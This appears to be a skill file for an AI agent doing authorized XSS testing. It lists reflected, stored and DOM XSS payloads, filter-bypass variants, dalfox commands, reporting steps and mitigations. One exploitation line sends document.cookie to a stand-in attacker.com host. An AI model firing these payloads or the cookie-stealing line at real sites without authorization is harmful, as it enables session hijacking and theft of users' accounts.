---
name: xss-testing
description: Professional skills for cross-site scripting (XSS) testing
version: 1.0.0
---

# XSS Testing Skill

## Overview

Cross-site scripting (XSS) allows an attacker to execute malicious JavaScript in a victim's browser. This skill covers reflected, stored, and DOM-based XSS testing.

## XSS Types

### 1. Reflected XSS
- Malicious scripts are passed through URL parameters
- The server returns a response containing the script
- The user must click a malicious link

### 2. Stored XSS
- Malicious scripts are stored on the server (database, files, etc.)
- All users visiting the affected page execute the script
- Broader impact

### 3. DOM-Based XSS
- Client-side JavaScript mishandles user input
- No server-side processing involved
- Triggered by changes to the DOM

## Testing Methods

### Basic Payloads
```javascript
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
```

### Filter Bypass

#### Letter Case Bypass
```javascript
<ScRiPt>alert('XSS')</ScRiPt>
```

#### Encoding Bypass
```javascript
%3Cscript%3Ealert('XSS')%3C/script%3E
&#60;script&#62;alert('XSS')&#60;/script&#62;
```

#### Event Handlers
```javascript
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
<div onmouseover=alert('XSS')>hover</div>
<input onfocus=alert('XSS') autofocus>
```

#### Pseudo-Protocols
```javascript
<a href="javascript:alert('XSS')">click</a>
<iframe src="javascript:alert('XSS')">
```

### Advanced Bypass Techniques

#### Using String.fromCharCode
```javascript
<script>alert(String.fromCharCode(88,83,83))</script>
```

#### Using eval and atob
```javascript
<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
```

#### Using HTML Entities
```javascript
&#60;script&#62;alert('XSS')&#60;/script&#62;
```

## Tools

### dalfox
```bash
# Basic scan
dalfox url "http://target.com/page?q=test"

# Specify parameters
dalfox url "http://target.com/page" -d "q=test" -X POST

# Use a custom payload
dalfox url "http://target.com/page?q=test" --custom-payload payloads.txt
```

### Burp Suite
- Use Intruder for batch testing
- Use Repeater for manual testing
- Use Scanner for automated detection

### Browser Console
- Test DOM-based XSS
- Inspect the JavaScript execution context
- Debug payloads

## Verification and Exploitation

### Verification Steps
1. Confirm that the payload executes
2. Check whether it is filtered or encoded
3. Test different contexts (HTML, JavaScript, attributes, etc.)
4. Assess impact (cookie theft, session hijacking, etc.)

### Exploitation Scenarios
- Cookie theft: `<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>`
- Keylogging: Inject keyboard event listeners
- Phishing: Forge login forms
- Session hijacking: Obtain user session tokens

## Report Essentials

- XSS type (reflected/stored/DOM)
- Trigger location and parameters
- Complete PoC
- Impact assessment
- Remediation guidance (output encoding, CSP, etc.)
- Once confirmed, record findings with `report_finding`, the platform's only entry point for findings

## Mitigations

- Input validation and filtering
- Output encoding (HTML, JavaScript, URL)
- Content Security Policy (CSP)
- HttpOnly cookie flag
- Use secure frameworks and libraries
